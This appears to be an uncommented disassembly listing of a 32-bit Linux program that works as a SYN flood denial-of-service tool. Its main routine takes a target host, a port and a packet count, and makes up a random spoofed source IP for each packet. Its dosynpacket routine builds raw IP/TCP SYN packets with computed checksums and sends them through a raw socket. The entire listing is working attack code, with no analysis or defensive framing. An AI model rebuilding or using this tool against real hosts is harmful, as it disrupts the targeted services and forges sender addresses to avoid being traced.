call   8048dc0 <__do_global_ctors_aux>
ret    0x0
push   DWORD PTR ds:0x8049efc
jmp    DWORD PTR ds:0x8049f00
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x8049f04
push   0x0
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f08
push   0x8
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f0c
push   0x10
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f10
push   0x18
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f14
push   0x20
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f18
push   0x28
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f1c
push   0x30
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f20
push   0x38
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f24
push   0x40
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f28
push   0x48
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f2c
push   0x50
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f30
push   0x58
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f34
push   0x60
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f38
push   0x68
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f3c
push   0x70
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f40
push   0x78
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f44
push   0x80
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f48
push   0x88
jmp    8048588 <.plt>
jmp    DWORD PTR ds:0x8049f4c
push   0x90
jmp    8048588 <.plt>
pop    ecx
mov    ebx,esp
mov    eax,esp
and    esp,0xfffffff8
mov    edx,ecx
add    edx,edx
add    edx,edx
add    eax,edx
add    eax,0x4
xor    ebp,ebp
push   ebp
push   ebp
push   ebp
mov    ebp,esp
push   eax
push   ebx
push   ecx
mov    eax,0x88
mov    ebx,0x0
int    0x80
mov    eax,DWORD PTR [esp+0x8]
mov    ds:0x8049ee4,eax
movzx  eax,WORD PTR ds:0x804a02c
push   eax
call   80486a8 <__setfpucw@plt>
add    esp,0x4
call   80485c8 <__libc_init@plt>
push   0x8048e00
call   8048668 <atexit@plt>
add    esp,0x4
call   8048580 <_init>
call   8048790 <main>
push   eax
call   8048688 <exit@plt>
pop    ebx
lea    esi,[esi+eiz*1+0x0]
lea    edi,[edi+eiz*1+0x0]
mov    eax,0x1
int    0x80
jmp    8048740 <done>
lea    esi,[esi+eiz*1+0x0]
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x8049ef4
cmp    DWORD PTR ds:0x8049ef4,0x0
je     8048770 <__do_global_dtors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0x4
cmp    DWORD PTR [ebx],0x0
jne    8048764 <__do_global_dtors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
mov    esp,ebp
pop    ebp
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x3c
mov    WORD PTR [ebp-0x2e],0x50
mov    DWORD PTR [ebp-0x34],0x3e8
push   0x8048e08
call   8048598 <printf@plt>
add    esp,0x4
cmp    DWORD PTR [ebp+0x8],0x1
jg     80487e0 <main+0x50>
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
push   0x8048e2a
call   8048598 <printf@plt>
add    esp,0x8
push   0x0
call   8048688 <exit@plt>
add    esp,0x4
lea    esi,[esi+0x0]
lea    edi,[edi+eiz*1+0x0]
call   8048d90 <initrand>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
call   8048cf0 <host2ip>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x2c],eax
cmp    DWORD PTR [ebp+0x8],0x2
jle    8048818 <main+0x88>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x8
mov    edx,DWORD PTR [eax]
push   edx
call   8048698 <atoi@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0x2e],ax
cmp    DWORD PTR [ebp+0x8],0x3
jle    8048832 <main+0xa2>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0xc
mov    edx,DWORD PTR [eax]
push   edx
call   8048698 <atoi@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x34],eax
cmp    WORD PTR [ebp-0x2e],0x0
jne    804883f <main+0xaf>
mov    WORD PTR [ebp-0x2e],0x50
cmp    DWORD PTR [ebp-0x34],0x0
jne    804884c <main+0xbc>
mov    DWORD PTR [ebp-0x34],0x3e8
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
push   0x8048e59
call   8048598 <printf@plt>
add    esp,0x8
movzx  eax,WORD PTR [ebp-0x2e]
push   eax
push   0x8048e6c
call   8048598 <printf@plt>
add    esp,0x8
mov    eax,DWORD PTR [ebp-0x34]
push   eax
push   0x8048e7f
call   8048598 <printf@plt>
add    esp,0x8
cmp    DWORD PTR [ebp+0x8],0x4
jle    80488b7 <main+0x127>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x10
mov    edx,DWORD PTR [eax]
push   edx
push   0x8048e92
call   8048598 <printf@plt>
add    esp,0x8
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x10
mov    edx,DWORD PTR [eax]
push   edx
call   8048cf0 <host2ip>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x28],eax
nop
mov    DWORD PTR [ebp-0x14],0x0
mov    eax,DWORD PTR [ebp-0x14]
cmp    DWORD PTR [ebp-0x34],eax
ja     80488d0 <main+0x140>
jmp    8048a70 <main+0x2e0>
lea    esi,[esi+eiz*1+0x0]
call   80485f8 <rand@plt>
mov    eax,eax
push   eax
fild   DWORD PTR [esp]
add    esp,0x4
fld    QWORD PTR ds:0x8048eb4
fmulp  st(1),st
fld    QWORD PTR ds:0x8048ebc
fdivp  st(1),st
fnstcw WORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x38]
mov    ch,0xc
mov    DWORD PTR [ebp-0x3c],ecx
fldcw  WORD PTR [ebp-0x3c]
sub    esp,0x4
fistp  DWORD PTR [esp]
pop    eax
fldcw  WORD PTR [ebp-0x38]
lea    ecx,[eax+0x1]
mov    DWORD PTR [ebp-0x18],ecx
call   80485f8 <rand@plt>
mov    eax,eax
push   eax
fild   DWORD PTR [esp]
add    esp,0x4
fld    QWORD PTR ds:0x8048eb4
fmulp  st(1),st
fld    QWORD PTR ds:0x8048ebc
fdivp  st(1),st
fnstcw WORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x38]
mov    ch,0xc
mov    DWORD PTR [ebp-0x3c],ecx
fldcw  WORD PTR [ebp-0x3c]
sub    esp,0x4
fistp  DWORD PTR [esp]
pop    eax
fldcw  WORD PTR [ebp-0x38]
lea    ecx,[eax+0x1]
mov    DWORD PTR [ebp-0x1c],ecx
call   80485f8 <rand@plt>
mov    eax,eax
push   eax
fild   DWORD PTR [esp]
add    esp,0x4
fld    QWORD PTR ds:0x8048eb4
fmulp  st(1),st
fld    QWORD PTR ds:0x8048ebc
fdivp  st(1),st
fnstcw WORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x38]
mov    ch,0xc
mov    DWORD PTR [ebp-0x3c],ecx
fldcw  WORD PTR [ebp-0x3c]
sub    esp,0x4
fistp  DWORD PTR [esp]
pop    eax
fldcw  WORD PTR [ebp-0x38]
lea    ecx,[eax+0x1]
mov    DWORD PTR [ebp-0x20],ecx
call   80485f8 <rand@plt>
mov    eax,eax
push   eax
fild   DWORD PTR [esp]
add    esp,0x4
fld    QWORD PTR ds:0x8048eb4
fmulp  st(1),st
fld    QWORD PTR ds:0x8048ebc
fdivp  st(1),st
fnstcw WORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x38]
mov    ch,0xc
mov    DWORD PTR [ebp-0x3c],ecx
fldcw  WORD PTR [ebp-0x3c]
sub    esp,0x4
fistp  DWORD PTR [esp]
pop    eax
fldcw  WORD PTR [ebp-0x38]
lea    ecx,[eax+0x1]
mov    DWORD PTR [ebp-0x24],ecx
call   80485f8 <rand@plt>
mov    eax,eax
push   eax
fild   DWORD PTR [esp]
add    esp,0x4
fld    QWORD PTR ds:0x8048ec4
fmulp  st(1),st
fld    QWORD PTR ds:0x8048ebc
fdivp  st(1),st
fnstcw WORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x38]
mov    ch,0xc
mov    DWORD PTR [ebp-0x3c],ecx
fldcw  WORD PTR [ebp-0x3c]
sub    esp,0x4
fistp  DWORD PTR [esp]
pop    eax
fldcw  WORD PTR [ebp-0x38]
mov    ecx,eax
inc    cx
mov    WORD PTR [ebp-0x30],cx
mov    eax,DWORD PTR [ebp-0x24]
push   eax
mov    eax,DWORD PTR [ebp-0x20]
push   eax
mov    eax,DWORD PTR [ebp-0x1c]
push   eax
mov    eax,DWORD PTR [ebp-0x18]
push   eax
push   0x8048ea6
lea    eax,[ebp-0x10]
push   eax
call   8048658 <sprintf@plt>
add    esp,0x18
cmp    DWORD PTR [ebp+0x8],0x4
jle    8048a30 <main+0x2a0>
mov    eax,DWORD PTR [ebp-0x28]
mov    DWORD PTR [ebp-0x4],eax
jmp    8048a3f <main+0x2af>
lea    esi,[esi+0x0]
lea    eax,[ebp-0x10]
push   eax
call   80485e8 <inet_addr@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x4],eax
movzx  eax,WORD PTR [ebp-0x30]
push   eax
movzx  eax,WORD PTR [ebp-0x2e]
push   eax
mov    eax,DWORD PTR [ebp-0x2c]
push   eax
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048a80 <dosynpacket>
add    esp,0x10
inc    DWORD PTR [ebp-0x14]
jmp    80488bf <main+0x12f>
jmp    8048a70 <main+0x2e0>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
lea    edi,[edi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x64
push   esi
push   ebx
mov    ebx,DWORD PTR [ebp+0x10]
mov    esi,DWORD PTR [ebp+0x14]
mov    WORD PTR [ebp-0x2],bx
mov    WORD PTR [ebp-0x4],si
and    BYTE PTR [ebp-0x2c],0xf0
or     BYTE PTR [ebp-0x2c],0x5
and    BYTE PTR [ebp-0x2c],0xf
or     BYTE PTR [ebp-0x2c],0x40
mov    BYTE PTR [ebp-0x2b],0x0
push   0x28
call   8048678 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0x2a],ax
mov    ax,WORD PTR [ebp-0x4]
mov    WORD PTR [ebp-0x28],ax
mov    WORD PTR [ebp-0x26],0x0
mov    BYTE PTR [ebp-0x24],0xff
mov    BYTE PTR [ebp-0x23],0x6
mov    WORD PTR [ebp-0x22],0x0
mov    eax,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x20],eax
mov    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x1c],eax
mov    ax,WORD PTR [ebp-0x4]
mov    WORD PTR [ebp-0x18],ax
movzx  eax,WORD PTR [ebp-0x2]
push   eax
call   8048678 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0x16],ax
movzx  ecx,WORD PTR [ebp-0x4]
mov    DWORD PTR [ebp-0x14],ecx
mov    DWORD PTR [ebp-0x10],0x0
and    BYTE PTR [ebp-0xc],0xf0
and    BYTE PTR [ebp-0xc],0xf
or     BYTE PTR [ebp-0xc],0x50
and    BYTE PTR [ebp-0xb],0xfe
or     BYTE PTR [ebp-0xb],0x2
and    BYTE PTR [ebp-0xb],0xfb
and    BYTE PTR [ebp-0xb],0xf7
and    BYTE PTR [ebp-0xb],0xef
and    BYTE PTR [ebp-0xb],0xdf
and    BYTE PTR [ebp-0xb],0x3f
push   0x200
call   8048678 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0xa],ax
mov    WORD PTR [ebp-0x8],0x0
mov    WORD PTR [ebp-0x6],0x0
mov    WORD PTR [ebp-0x60],0x2
mov    ax,WORD PTR [ebp-0x18]
mov    WORD PTR [ebp-0x5e],ax
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x5c],eax
push   0xff
push   0x3
push   0x2
call   80485b8 <socket@plt>
add    esp,0xc
mov    eax,eax
mov    DWORD PTR [ebp-0x50],eax
cmp    DWORD PTR [ebp-0x50],0x0
jge    8048ba0 <dosynpacket+0x120>
push   0x8048ecc
call   80485a8 <perror@plt>
add    esp,0x4
push   0x1
call   8048688 <exit@plt>
add    esp,0x4
lea    esi,[esi+eiz*1+0x0]
inc    WORD PTR [ebp-0x18]
inc    WORD PTR [ebp-0x28]
inc    DWORD PTR [ebp-0x14]
mov    WORD PTR [ebp-0x8],0x0
mov    WORD PTR [ebp-0x22],0x0
push   0x14
lea    eax,[ebp-0x2c]
push   eax
call   8048c60 <in_cksum>
add    esp,0x8
mov    eax,eax
mov    WORD PTR [ebp-0x22],ax
mov    eax,DWORD PTR [ebp-0x20]
mov    DWORD PTR [ebp-0x4c],eax
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x48],eax
mov    BYTE PTR [ebp-0x44],0x0
mov    BYTE PTR [ebp-0x43],0x6
push   0x14
call   8048678 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0x42],ax
push   0x14
lea    eax,[ebp-0x4c]
lea    edx,[eax+0xc]
push   edx
lea    eax,[ebp-0x2c]
lea    edx,[eax+0x14]
push   edx
call   8048618 <bcopy@plt>
add    esp,0xc
push   0x20
lea    eax,[ebp-0x4c]
push   eax
call   8048c60 <in_cksum>
add    esp,0x8
mov    eax,eax
mov    WORD PTR [ebp-0x8],ax
mov    DWORD PTR [ebp-0x64],0x10
mov    eax,DWORD PTR [ebp-0x64]
push   eax
lea    eax,[ebp-0x60]
push   eax
push   0x0
push   0x28
lea    eax,[ebp-0x2c]
push   eax
mov    eax,DWORD PTR [ebp-0x50]
push   eax
call   8048608 <sendto@plt>
add    esp,0x18
mov    eax,DWORD PTR [ebp-0x50]
push   eax
call   80486b8 <close@plt>
add    esp,0x4
lea    esp,[ebp-0x6c]
pop    ebx
pop    esi
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x4
push   ebx
xor    edx,edx
cmp    DWORD PTR [ebp+0xc],0x1
jg     8048c80 <in_cksum+0x20>
jmp    8048ca0 <in_cksum+0x40>
jmp    8048c80 <in_cksum+0x20>
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov    eax,DWORD PTR [ebp+0x8]
movzx  ebx,WORD PTR [eax]
add    edx,ebx
add    DWORD PTR [ebp+0x8],0x2
add    DWORD PTR [ebp+0xc],0xfffffffe
jmp    8048c69 <in_cksum+0x9>
lea    esi,[esi+eiz*1+0x0]
lea    edi,[edi+eiz*1+0x0]
cmp    DWORD PTR [ebp+0xc],0x1
jne    8048cba <in_cksum+0x5a>
mov    WORD PTR [ebp-0x2],0x0
mov    eax,DWORD PTR [ebp+0x8]
mov    bl,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x2],bl
movzx  eax,WORD PTR [ebp-0x2]
add    edx,eax
mov    eax,edx
sar    eax,0x10
movzx  ebx,dx
lea    edx,[ebx+eax*1]
mov    eax,edx
sar    eax,0x10
add    edx,eax
mov    ecx,edx
not    cx
movzx  ebx,cx
mov    eax,ebx
jmp    8048ce0 <in_cksum+0x80>
nop
lea    esi,[esi+eiz*1+0x0]
mov    ebx,DWORD PTR [ebp-0x8]
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x4
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   80485e8 <inet_addr@plt>
add    esp,0x4
mov    eax,eax
mov    ds:0x804a030,eax
cmp    DWORD PTR ds:0x804a030,0xffffffff
jne    8048d6d <host2ip+0x7d>
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   8048648 <gethostbyname@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048d50 <host2ip+0x60>
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8048ed3
push   0x8049fd8
call   80485d8 <fprintf@plt>
add    esp,0xc
push   0x0
call   8048688 <exit@plt>
add    esp,0x4
lea    esi,[esi+eiz*1+0x0]
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [eax+0xc]
push   edx
push   0x804a030
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [edx]
push   eax
call   8048618 <bcopy@plt>
add    esp,0xc
mov    eax,ds:0x804a030
jmp    8048d80 <host2ip+0x90>
lea    esi,[esi+0x0]
lea    edi,[edi+0x0]
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
lea    edi,[edi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
push   0x0
lea    eax,[ebp-0x8]
push   eax
call   8048628 <gettimeofday@plt>
add    esp,0x8
mov    eax,DWORD PTR [ebp-0x4]
push   eax
call   8048638 <srand@plt>
add    esp,0x4
mov    esp,ebp
pop    ebp
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x8049ee8
cmp    DWORD PTR ds:0x8049ee8,0xffffffff
je     8048de0 <__do_global_ctors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    8048dd4 <__do_global_ctors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
mov    esp,ebp
pop    ebp
ret    
mov    esi,esi
lea    edi,[edi+eiz*1+0x0]
push   ebp
mov    ebp,esp
mov    esp,ebp
pop    ebp
ret    
nop
call   8048750 <__do_global_dtors_aux>
ret    0x0
